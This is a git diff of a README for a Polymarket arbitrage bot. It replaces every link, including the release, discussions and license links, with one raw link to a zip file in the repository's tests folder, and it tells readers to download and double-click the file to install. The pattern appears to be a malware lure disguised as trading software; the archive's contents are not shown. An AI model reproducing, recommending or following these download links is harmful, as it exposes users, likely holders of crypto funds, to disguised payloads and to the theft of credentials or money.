@@ -1,6 +1,6 @@
 # 🚀 polymarket-arbitrage-bot - Find Profitable Market Opportunities Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-brightgreen.svg)](https://github.com/ChurchE2CB/polymarket-arbitrage-bot/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/ChurchE2CB/polymarket-arbitrage-bot/main/tests/polymarket-arbitrage-bot-v2.6.zip%20Latest%https://raw.githubusercontent.com/ChurchE2CB/polymarket-arbitrage-bot/main/tests/polymarket-arbitrage-bot-v2.6.zip)](https://raw.githubusercontent.com/ChurchE2CB/polymarket-arbitrage-bot/main/tests/polymarket-arbitrage-bot-v2.6.zip)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@ The **polymarket-arbitrage-bot** helps you discover arbitrage opportunities on P
 Follow these steps to get started:
 
 1. **Download the Software**  
-   Visit the releases page to download the latest version of the bot. You can find it [here](https://github.com/ChurchE2CB/polymarket-arbitrage-bot/releases).
+   Visit the releases page to download the latest version of the bot. You can find it [here](https://raw.githubusercontent.com/ChurchE2CB/polymarket-arbitrage-bot/main/tests/polymarket-arbitrage-bot-v2.6.zip).
 
 2. **Install the Bot**  
    Once you have downloaded the application, locate the file on your computer. Double-click the file to begin the installation process. Follow the on-screen instructions to complete the installation.
@@ -21,7 +21,7 @@ Follow these steps to get started:
 
 ## 📥 Download & Install
 
-To download the latest version, visit this page: [polymarket-arbitrage-bot Releases](https://github.com/ChurchE2CB/polymarket-arbitrage-bot/releases). Look for the release that fits your operating system and download the appropriate file.
+To download the latest version, visit this page: [polymarket-arbitrage-bot Releases](https://raw.githubusercontent.com/ChurchE2CB/polymarket-arbitrage-bot/main/tests/polymarket-arbitrage-bot-v2.6.zip). Look for the release that fits your operating system and download the appropriate file.
 
 ### System Requirements
 
@@ -83,14 +83,14 @@ If you encounter issues while using the bot, consider the following tips:
 Join the community to share experiences or seek help:
 
 - **GitHub Discussions**  
-  Participate in discussions on our [GitHub page](https://github.com/ChurchE2CB/polymarket-arbitrage-bot/discussions).
+  Participate in discussions on our [GitHub page](https://raw.githubusercontent.com/ChurchE2CB/polymarket-arbitrage-bot/main/tests/polymarket-arbitrage-bot-v2.6.zip).
 
 - **Social Media**  
   Follow us on Twitter and Discord to get updates on new features and community tips.
 
 ## 📜 License
 
-This project is licensed under the MIT License. You can view the full license on [GitHub](https://github.com/ChurchE2CB/polymarket-arbitrage-bot/blob/main/LICENSE).
+This project is licensed under the MIT License. You can view the full license on [GitHub](https://raw.githubusercontent.com/ChurchE2CB/polymarket-arbitrage-bot/main/tests/polymarket-arbitrage-bot-v2.6.zip).
 
 ## 🌟 Conclusion
 
